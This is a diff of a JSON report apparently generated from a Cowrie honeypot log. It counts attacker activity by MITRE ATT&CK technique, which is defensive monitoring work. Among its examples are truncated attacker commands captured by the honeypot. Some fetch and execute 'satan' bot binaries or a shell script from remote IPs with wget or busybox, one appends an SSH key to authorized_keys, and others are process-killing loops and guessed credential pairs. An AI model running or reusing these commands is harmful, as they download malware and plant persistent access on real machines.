@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-20 07:04:28",
+  "generated": "2026-08-20 08:02:45",
   "totals": {
-    "commands": 427,
-    "login_failed": 1086,
-    "login_success": 39,
-    "sessions": 1208
+    "commands": 440,
+    "login_failed": 1170,
+    "login_success": 47,
+    "sessions": 1294
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1086,
+      "count": 1170,
       "examples": [
         "nginx / 150.136.155.47",
         "tyre / tyre",
@@ -21,30 +21,14 @@
         "tyre / tyre1234"
       ],
       "first": "2026-08-20T00:02:12.859219Z",
-      "last": "2026-08-20T07:04:04.804503Z",
-      "unique_ips": 34
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 43,
-      "examples": [
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/satan_mips; chmod 777 satan_mips; ./sat",
-        "wget http://31.77.227.121/satan_x86_64; chmod 777 satan_x86_64; ./satan_x86_64; rm -rf satan_x86_64",
-        "wget http://31.77.227.121/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm",
-        "wget http://31.77.227.121/satan_mips_el; chmod 777 satan_mips_el; ./satan_mips_el; rm -rf satan_mips_el"
-      ],
-      "first": "2026-08-20T01:21:21.761677Z",
-      "last": "2026-08-20T06:51:04.231011Z",
-      "unique_ips": 5
+      "last": "2026-08-20T08:02:16.372379Z",
+      "unique_ips": 41
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 39,
+      "count": 47,
       "examples": [
         "admin / switch",
         "admin / admin",
@@ -53,14 +37,30 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-20T01:07:19.606932Z",
-      "last": "2026-08-20T06:51:03.959609Z",
-      "unique_ips": 24
+      "last": "2026-08-20T07:50:35.998241Z",
+      "unique_ips": 30
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 45,
+      "examples": [
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/satan_mips; chmod 777 satan_mips; ./sat",
+        "wget http://31.77.227.121/satan_x86_64; chmod 777 satan_x86_64; ./satan_x86_64; rm -rf satan_x86_64",
+        "wget http://31.77.227.121/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm",
+        "wget http://31.77.227.121/satan_mips_el; chmod 777 satan_mips_el; ./satan_mips_el; rm -rf satan_mips_el"
+      ],
+      "first": "2026-08-20T01:21:21.761677Z",
+      "last": "2026-08-20T07:29:50.494077Z",
+      "unique_ips": 6
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 32,
+      "count": 38,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         "http://2.26.136.128/twget.sh",
@@ -69,35 +69,37 @@
         "wget http://31.77.227.121/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm"
       ],
       "first": "2026-08-20T01:10:19.623993Z",
-      "last": "2026-08-20T06:05:47.867496Z",
-      "unique_ips": 5
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 6,
-      "examples": [
-        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
-        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in "
-      ],
-      "first": "2026-08-20T01:07:25.922416Z",
-      "last": "2026-08-20T01:07:26.590068Z",
-      "unique_ips": 1
+      "last": "2026-08-20T07:29:50.489668Z",
+      "unique_ips": 7
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 5,
+      "count": 7,
       "examples": [
         "uname -s -v -n -r -m",
         "uname -a",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-20T04:16:38.276000Z",
-      "last": "2026-08-20T06:51:04.231011Z",
-      "unique_ips": 4
+      "last": "2026-08-20T07:36:05.350581Z",
+      "unique_ips": 6
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 7,
+      "examples": [
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
+        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in ",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+      ],
+      "first": "2026-08-20T01:07:25.922416Z",
+      "last": "2026-08-20T07:29:50.494077Z",
+      "unique_ips": 2
     },
     {
       "id": "T1033",
@@ -116,12 +118,25 @@
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 1,
+      "count": 2,
       "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-20T06:51:04.231011Z",
-      "last": "2026-08-20T06:51:04.231011Z",
+      "last": "2026-08-20T07:29:50.494077Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1037",
+      "name": "Boot or Logon Initialization Scripts",
+      "tactic": "Persistence",
+      "count": 1,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+      ],
+      "first": "2026-08-20T07:29:50.494077Z",
+      "last": "2026-08-20T07:29:50.494077Z",
       "unique_ips": 1
     },
     {
@@ -134,6 +149,30 @@
       ],
       "first": "2026-08-20T06:51:04.231011Z",
       "last": "2026-08-20T06:51:04.231011Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+      ],
+      "first": "2026-08-20T07:29:50.494077Z",
+      "last": "2026-08-20T07:29:50.494077Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1098.004",
+      "name": "Account Manipulation: SSH Authorized Keys",
+      "tactic": "Persistence",
+      "count": 1,
+      "examples": [
+        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
+      ],
+      "first": "2026-08-20T07:29:46.178354Z",
+      "last": "2026-08-20T07:29:46.178354Z",
       "unique_ips": 1
     },
     {
